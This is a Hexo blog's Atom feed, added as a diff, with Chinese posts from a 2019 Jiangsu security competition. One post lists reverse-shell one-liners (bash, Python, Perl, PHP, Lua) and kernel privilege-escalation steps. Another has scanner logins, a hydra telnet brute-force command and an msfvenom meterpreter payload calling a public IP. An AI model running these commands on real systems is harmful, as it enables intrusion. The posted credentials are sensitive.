@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>d0_0ctor的博客</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2019-10-09T13:05:48.350Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>d0_0ctor</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>archives</title>
+    <link href="http://yoursite.com/2019/10/09/archives/"/>
+    <id>http://yoursite.com/2019/10/09/archives/</id>
+    <published>2019-10-09T13:05:48.000Z</published>
+    <updated>2019-10-09T13:05:48.350Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>比赛</title>
+    <link href="http://yoursite.com/2019/10/09/%E6%AF%94%E8%B5%9B-1/"/>
+    <id>http://yoursite.com/2019/10/09/比赛-1/</id>
+    <published>2019-10-08T21:48:16.000Z</published>
+    <updated>2019-10-08T21:57:59.636Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="2019第二届江苏省网络空间安全（保密）知识技能大赛总结"><a href="#2019第二届江苏省网络空间安全（保密）知识技能大赛总结" class="headerlink" title="2019第二届江苏省网络空间安全（保密）知识技能大赛总结"></a>2019第二届江苏省网络空间安全（保密）知识技能大赛总结</h1><p>前言：这次的省赛虽然经历了一些波折，虽然自己仍然很菜，但是在队友的加持下拿到了一等奖。先吐槽一下初赛，是迄今为止打过最烂的ctf，差点没进得了决赛，还好老师找人沟通了一下。决赛有点像护网，都是真实的网站进行真实的渗透测试，测试的网站是由抽签决定的，其实有很大的运气成分，但是实力很重要，这次比赛学到了很多实战方面的东西，暑假到现在的安服工作也对我有很大的帮助。</p><p>由于漏洞是网站真实存在的，不能记录太多细节，所以这里只记录一些思路和总结</p><h3 id="反弹shell常用方法："><a href="#反弹shell常用方法：" class="headerlink" title="反弹shell常用方法："></a>反弹shell常用方法：</h3><p>在拿到RCE后可以反弹shell，需要一台公网ip机器</p><h4 id="通过nc反弹shell"><a href="#通过nc反弹shell" class="headerlink" title="通过nc反弹shell"></a>通过nc反弹shell</h4><p>利用RCE执行：<code>bash -i-&gt;&amp;/dev/tcp/ip/port 0-&gt;&amp;1</code></p><p>ip和port为自己公网主机的</p><p>公网ip主机执行：<code>nc -lvp</code></p><h4 id="通过python反弹shell"><a href="#通过python反弹shell" class="headerlink" title="通过python反弹shell"></a>通过python反弹shell</h4><p>利用RCE执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></span><br></pre></td></tr></table></figure><p>ip和port为自己公网主机的</p><p>公网ip主机执行：<code>nc -lvp</code></p><h4 id="perl反弹shell"><a href="#perl反弹shell" class="headerlink" title="perl反弹shell"></a>perl反弹shell</h4><p>利用RCE执行</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.1.1.19";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><p>公网ip主机执行：<code>nc -lvp</code></p><h4 id="php反弹shell（php是世界上最好的语言）"><a href="#php反弹shell（php是世界上最好的语言）" class="headerlink" title="php反弹shell（php是世界上最好的语言）"></a>php反弹shell（php是世界上最好的语言）</h4><p>利用RCE执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.1.1.19",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>公网ip主机执行：<code>nc -lvp</code></p><h4 id="lua反弹shell"><a href="#lua反弹shell" class="headerlink" title="lua反弹shell"></a>lua反弹shell</h4><p>利用RCCE执行</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.1.1.19','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><p>公网ip主机执行：<code>nc -lvp</code></p><h3 id="提权常用方法"><a href="#提权常用方法" class="headerlink" title="提权常用方法"></a>提权常用方法</h3><p>反弹shell后权限一般较低，提权的方法挺多</p><p>提权方式：</p><ul><li><p>SUID提权，大师傅说这个方法实战很少，暂不深入，可参考网站</p><p><a href="https://www.freebuf.com/articles/system/149118.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/149118.html</a></p></li><li><p>内核提权</p></li><li></li></ul><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>查看发行版</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issuecat </span><br><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure><p>查看内核版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>大多内核漏洞通过内核版本就可搜到</p><p>用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspoit linux 2.6 ubuntu priv esc</span><br></pre></td></tr></table></figure><p>一般www权限可以在/tmp/目录（linux）或者c:\windows\system32\temp目录（windows）下有写的权限</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;2019第二届江苏省网络空间安全（保密）知识技能大赛总结&quot;&gt;&lt;a href=&quot;#2019第二届江苏省网络空间安全（保密）知识技能大赛总结&quot; class=&quot;headerlink&quot; title=&quot;2019第二届江苏省网络空间安全（保密）知识技能大赛总结&quot;&gt;&lt;/a&gt;20
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>比赛</title>
+    <link href="http://yoursite.com/2019/10/09/%E6%AF%94%E8%B5%9B/"/>
+    <id>http://yoursite.com/2019/10/09/比赛/</id>
+    <published>2019-10-08T21:48:16.000Z</published>
+    <updated>2019-10-08T21:53:53.539Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h2><p><a href="https://60.205.228.7:8834/#/" target="_blank" rel="noopener">https://60.205.228.7:8834/#/</a></p><p>Dozer/Dozer@2019</p><h2 id="awvs"><a href="#awvs" class="headerlink" title="awvs"></a>awvs</h2><p><a href="https://218.78.20.226:3443/#/" target="_blank" rel="noopener">https://218.78.20.226:3443/#/</a></p><p><a href="mailto:Dozer@Dozer.com" target="_blank" rel="noopener">Dozer@Dozer.com</a><br>Dozer@2019</p><h2 id="hydra-namp"><a href="#hydra-namp" class="headerlink" title="hydra / namp"></a>hydra / namp</h2><p>hydra -s 23 -V -l admin -P Weskpass/[filename] -t 16 -M IP地址目录 telnet；</p><p>22 23 380 1521 21 5900 3306 1433 </p><p>masscan -p 22 </p><h2 id="w12-scan"><a href="#w12-scan" class="headerlink" title="w12 scan"></a>w12 scan</h2><p><a href="http://www.shangdongshe.club:8086/user/login" target="_blank" rel="noopener">http://www.shangdongshe.club:8086/user/login</a><br>username:boyhack<br>password:boyhack</p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<img src="file:///C:%5CUsers%5CKnowAfterwards%5CAppData%5CRoaming%5CTencent%5CQQTempSys%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img">39.108.222.8 LPORT=9999 -f exe -a x86 –platform win -o shell.exe</p><p>39.108.228.8:9999</p><p>use exploit/multi/hanlder </p><p>set payload windows/meterpreter/reverse_tcp</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;nessus&quot;&gt;&lt;a href=&quot;#nessus&quot; class=&quot;headerlink&quot; title=&quot;nessus&quot;&gt;&lt;/a&gt;nessus&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://60.205.228.7:8834/#/&quot; target=&quot;_blank&quot;
+      
+    
+    </summary>
+    
+    
+    
+      <category term="比赛总结" scheme="http://yoursite.com/tags/%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://yoursite.com/2019/10/08/hello-world/"/>
+    <id>http://yoursite.com/2019/10/08/hello-world/</id>
+    <published>2019-10-08T00:37:51.938Z</published>
+    <updated>2019-10-08T00:37:51.938Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+</feed>
